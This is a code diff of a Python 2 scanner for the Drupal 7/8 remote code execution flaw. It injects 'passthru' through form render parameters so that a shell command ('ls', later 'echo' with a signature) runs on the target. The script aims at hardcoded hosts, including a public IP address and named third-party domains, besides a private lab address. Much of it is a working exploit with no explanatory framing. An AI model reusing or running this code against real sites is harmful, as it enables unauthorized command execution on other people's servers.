@@ -2,28 +2,34 @@ import requests
 import re
 import bb01_ultilities as ulti
 
+# Fuction to check if the exploited form is avaiable
+# - RETURN:
+#     True: if the form can be connected
+#     False: if the form can be connected
+#     newURL -> string: if the form is redirected to other
 
 
-"""
-Fuction to check if the exploited form is avaiable
-- RETURN:
-    True: if the form can be connected 
-    False: if the form can be connected
-    newURL -> string: if the form is redirected to other """
 def isFormValid(host, version):
     form_id = 'user/password' if version[:1] == '7' else 'user/register'
     urlq = host + '?q=' + form_id
     url = host + form_id
 
-    redirectURL = ulti.isURLRedirected(url)
-    if (redirectURL is not False):
-        return redirectURL
+    # redirectURL = ulti.isURLRedirected(urlq)
+    # if (redirectURL is not False):
+    #     print 'Redirected'
+    #     print redirectURL
+    #     return redirectURL
 
-    if(ulti.isURLRedirected(url) is not False):
-        url = ulti.isURLRedirected(url)
+    check = ulti.checkURLStatus(urlq)
+    if (check is not False):
+        # print check
+        return check
 
-    if (ulti.isURLValid(urlq) or ulti.isURLValid(url)):
-        return True
+    # if(redirectURL is not False):
+    #     url = ulti.isURLRedirected(url)
+
+    # if (ulti.isURLValid(urlq) or ulti.isURLValid(url)):
+    #     return True
 
     return False
 
@@ -33,7 +39,8 @@ def isPwnAble(host, version):
     version = version[:1]
     if version == '7':
         get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
-                      'name[#type]': 'markup', 'name[#markup]': ' ls '}
+                      'name[#type]': 'markup',
+                      'name[#markup]': ' echo ' + signature}
         post_params = {'form_id': 'user_pass',
                        '_triggering_element_name': 'name'}
         try:
@@ -41,8 +48,8 @@ def isPwnAble(host, version):
                               params=get_params, verify=False)
         except:
             return False
-        m = re.search(r'<input type="hidden" name="form_build_id" \
-                       value="([^"]+)"', r.text)
+        m = re.search(r'<input type="hidden" name="form_build_id"'
+                      ' value="([^"]+)"', r.text)
         if m:
             found = m.group(1)
             get_params = {'q': 'file/ajax/name/#value/' + found}
@@ -73,8 +80,8 @@ def isPwnAble(host, version):
 
 
 def isVuln(host, version):
-    if isFormValid(host,version) is False:
-    	return False
+    if isFormValid(host, version) is False:
+        return False
 
     if isPwnAble(host, version) is False:
         return False
@@ -82,20 +89,23 @@ def isVuln(host, version):
     return True
 
 
-host = 'http://abohn.org/'
+host = 'http://83.240.184.26/drupal/'
 host = 'http://192.168.210.134'
-host = 'http://zestman.com/'
+# hos = 'http://zestman.com/'
 version = '7.44'
-version = '8.2'
+# ver = '8.2'
 print 'Testing: ', host
 print '=' * 25
-
+# ulti.isURLRedirected(host+'user/password')
+# ulti.isURLRedirected('http://192.168.210.134/?q=user/password')
 # print isPwnAbleRedirect('x','7')
 # print isPwnAble(host, version)
 try:
-	if isVuln(host,version):
-		print " This site is vulnerable"
-	else:
-		print " This site is invulnerable"
+    host = ''.join([host, 'user/register?element_parents=account/mail/%23',
+                'value&ajax_form=1&_wrapper_format=drupal_ajax'])
+    if isVuln(host, version):
+        print " This site is vulnerable"
+    else:
+        print " This site is invulnerable"
 except:
-	pass
+    pass
